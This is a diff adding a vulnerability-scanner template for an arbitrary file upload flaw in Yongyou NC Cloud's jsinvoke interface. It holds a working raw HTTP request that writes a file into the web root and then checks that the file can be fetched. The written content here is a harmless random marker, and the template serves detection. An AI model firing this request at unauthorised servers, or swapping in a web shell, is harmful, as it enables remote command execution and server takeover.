@@ -1,0 +1,42 @@
+id: yongyou-nc-cloud-file-upload
+
+info:
+  name: Yongyou NC Cloud jsinvoke File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The jsinvoke interface in Yongyou NC Cloud contains an arbitrary file upload vulnerability. Through this vulnerability, an attacker can execute arbitrary commands on the server, upload backdoors, and potentially take full control of the server.
+  classification:
+    cvss-score: 9.8
+  tags: file-upload
+
+variables:
+  random_payload: "{{rand_text_alphanumeric(16)}}"
+  random_filename: "{{rand_text_alphanumeric(8)}}.jsp"
+
+http:
+  - raw:
+      - |
+        POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["{{random_payload}}","webapps/nc_web/{{random_filename}}"]}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /webapps/nc_web/{{random_filename}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{random_payload}}"
